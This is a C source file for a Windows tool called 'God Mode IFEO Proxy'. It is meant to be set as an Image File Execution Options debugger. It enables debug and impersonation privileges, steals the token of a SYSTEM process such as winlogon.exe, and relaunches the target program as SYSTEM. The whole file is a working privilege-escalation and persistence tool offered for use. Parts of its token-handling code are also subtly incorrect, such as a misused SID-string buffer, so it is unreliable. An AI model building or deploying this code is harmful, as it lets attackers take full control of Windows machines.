/*
 * gmproxy.c — God Mode IFEO Proxy
 * Launches the target application as SYSTEM via token theft.
 * When IFEO Debugger redirects to this proxy, the original command line is passed
 * as arguments. The proxy steals a SYSTEM token from a suitable process and
 * launches the original target with that token.
 *
 * Usage: gmproxy.exe <path_to_original.exe> [arguments...]
 */
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <tchar.h>

#pragma comment(lib, "advapi32.lib")

#define TOKEN_ALL_ACCESS           0xF01FF
#define TOKEN_DUPLICATE            0x0002
#define TOKEN_QUERY                0x0008
#define SecurityImpersonation      2
#define TokenPrimary               1
#define PROCESS_QUERY_LIMITED_INFORMATION 0x1000
#define LOGON_WITH_PROFILE         1

typedef BOOL (WINAPI *CreateProcessWithTokenW_t)(
    HANDLE hToken,
    DWORD dwLogonFlags,
    LPCWSTR lpApplicationName,
    LPWSTR lpCommandLine,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCWSTR lpCurrentDirectory,
    LPSTARTUPINFOW lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation);

static BOOL EnablePrivilege(LPCWSTR privName) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return FALSE;
    LUID luid;
    if (!LookupPrivilegeValueW(NULL, privName, &luid)) { CloseHandle(hToken); return FALSE; }
    TOKEN_PRIVILEGES tp = {0};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL ok = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    return ok && GetLastError() == 0;
}

static DWORD FindSystemProcessForToken(void) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    DWORD result = 0;

    const wchar_t* priorityNames[] = { L"winlogon.exe", L"dwm.exe", L"fontdrvhost.exe", NULL };

    // First pass: Session 1 interactive desktop SYSTEM processes
    for (int i = 0; priorityNames[i] != NULL; i++) {
        if (Process32FirstW(hSnap, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, priorityNames[i]) == 0) {
                    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
                    if (hProcess) {
                        HANDLE hToken;
                        if (OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
                            TOKEN_STATISTICS stats;
                            DWORD len;
                            if (GetTokenInformation(hToken, TokenStatistics, &stats, sizeof(stats), &len)) {
                                // Check if SYSTEM SID (S-1-5-18) by checking authentication ID
                                // S-1-5-18 has a well-known LUID; for simplicity we just check if token opened
                                // and is a primary token type. Better: check TokenUser.
                                BYTE userBuf[256];
                                if (GetTokenInformation(hToken, TokenUser, userBuf, sizeof(userBuf), &len)) {
                                    TOKEN_USER* tu = (TOKEN_USER*)userBuf;
                                    WCHAR sidStr[256] = {0};
                                    if (ConvertSidToStringSidW(tu->User.Sid, &sidStr)) {
                                        if (wcscmp(sidStr, L"S-1-5-18") == 0) {
                                            LocalFree(sidStr);
                                            CloseHandle(hToken);
                                            CloseHandle(hProcess);
                                            CloseHandle(hSnap);
                                            return pe.th32ProcessID;
                                        }
                                        LocalFree(sidStr);
                                    }
                                }
                            }
                            CloseHandle(hToken);
                        }
                        CloseHandle(hProcess);
                    }
                }
            } while (Process32NextW(hSnap, &pe));
        }
        // Reset snapshot for next iteration
        CloseHandle(hSnap);
        hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap == INVALID_HANDLE_VALUE) return 0;
    }

    // Second pass: any accessible SYSTEM process
    if (Process32FirstW(hSnap, &pe)) {
        do {
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
            if (hProcess) {
                HANDLE hToken;
                if (OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
                    BYTE userBuf[256];
                    DWORD len;
                    if (GetTokenInformation(hToken, TokenUser, userBuf, sizeof(userBuf), &len)) {
                        TOKEN_USER* tu = (TOKEN_USER*)userBuf;
                        WCHAR sidStr[256] = {0};
                        if (ConvertSidToStringSidW(tu->User.Sid, &sidStr)) {
                            if (wcscmp(sidStr, L"S-1-5-18") == 0) {
                                LocalFree(sidStr);
                                CloseHandle(hToken);
                                CloseHandle(hProcess);
                                CloseHandle(hSnap);
                                return pe.th32ProcessID;
                            }
                            LocalFree(sidStr);
                        }
                    }
                    CloseHandle(hToken);
                }
                CloseHandle(hProcess);
            }
        } while (Process32NextW(hSnap, &pe));
    }

    CloseHandle(hSnap);
    return 0;
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc < 2) {
        fwprintf(stderr, L"[GM-PROXY] Usage: gmproxy.exe <path_to_original.exe> [args...]\n");
        return 1;
    }

    EnablePrivilege(L"SeDebugPrivilege");
    EnablePrivilege(L"SeImpersonatePrivilege");
    EnablePrivilege(L"SeAssignPrimaryTokenPrivilege");

    DWORD srcPid = FindSystemProcessForToken();
    if (srcPid == 0) {
        fwprintf(stderr, L"[GM-PROXY] ERROR: No accessible SYSTEM process found.\n");
        return 1;
    }

    HANDLE hSrc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, srcPid);
    if (!hSrc) {
        fwprintf(stderr, L"[GM-PROXY] ERROR: OpenProcess failed on SYSTEM PID %lu.\n", srcPid);
        return 1;
    }

    HANDLE hSrcToken;
    if (!OpenProcessToken(hSrc, TOKEN_DUPLICATE | TOKEN_QUERY, &hSrcToken)) {
        fwprintf(stderr, L"[GM-PROXY] ERROR: OpenProcessToken failed.\n");
        CloseHandle(hSrc);
        return 1;
    }

    HANDLE hPrimary;
    if (!DuplicateTokenEx(hSrcToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimary)) {
        fwprintf(stderr, L"[GM-PROXY] ERROR: DuplicateTokenEx failed.\n");
        CloseHandle(hSrcToken);
        CloseHandle(hSrc);
        return 1;
    }

    // Set Session ID to 1 for interactive desktop
    DWORD sessionId = 1;
    SetTokenInformation(hPrimary, TokenSessionId, &sessionId, sizeof(sessionId));

    // Build command line from argv
    size_t cmdLen = 0;
    for (int i = 1; i < argc; i++) {
        cmdLen += wcslen(argv[i]) + 3; // quotes + space
    }
    wchar_t* cmdLine = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (cmdLen + 1) * sizeof(wchar_t));
    if (!cmdLine) {
        CloseHandle(hPrimary);
        CloseHandle(hSrcToken);
        CloseHandle(hSrc);
        return 1;
    }

    for (int i = 1; i < argc; i++) {
        if (i > 1) wcscat(cmdLine, L" ");
        // If argument contains spaces, wrap in quotes
        if (wcschr(argv[i], L' ')) {
            wcscat(cmdLine, L"\"");
            wcscat(cmdLine, argv[i]);
            wcscat(cmdLine, L"\"");
        } else {
            wcscat(cmdLine, argv[i]);
        }
    }

    STARTUPINFOW si = {0};
    si.cb = sizeof(si);
    si.lpDesktop = L"WinSta0\\Default";

    PROCESS_INFORMATION pi = {0};

    // Try CreateProcessWithTokenW (requires Vista+)
    HMODULE hAdv = GetModuleHandleW(L"advapi32.dll");
    CreateProcessWithTokenW_t cpwt = NULL;
    if (hAdv) {
        cpwt = (CreateProcessWithTokenW_t)GetProcAddress(hAdv, "CreateProcessWithTokenW");
    }

    BOOL ok = FALSE;
    if (cpwt) {
        ok = cpwt(hPrimary, LOGON_WITH_PROFILE, argv[1], cmdLine, CREATE_UNICODE_ENVIRONMENT, NULL, NULL, &si, &pi);
    }

    // Fallback: CreateProcessAsUser
    if (!ok) {
        ok = CreateProcessAsUserW(hPrimary, argv[1], cmdLine, NULL, NULL, FALSE, CREATE_UNICODE_ENVIRONMENT, NULL, NULL, &si, &pi);
    }

    if (!ok) {
        fwprintf(stderr, L"[GM-PROXY] ERROR: CreateProcessAsUser/WithToken failed. GLE=%lu\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, cmdLine);
        CloseHandle(hPrimary);
        CloseHandle(hSrcToken);
        CloseHandle(hSrc);
        return 1;
    }

    fwprintf(stderr, L"[GM-PROXY] SUCCESS: Launched %s as SYSTEM (PID=%lu).\n", argv[1], pi.dwProcessId);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    HeapFree(GetProcessHeap(), 0, cmdLine);
    CloseHandle(hPrimary);
    CloseHandle(hSrcToken);
    CloseHandle(hSrc);
    return 0;
}
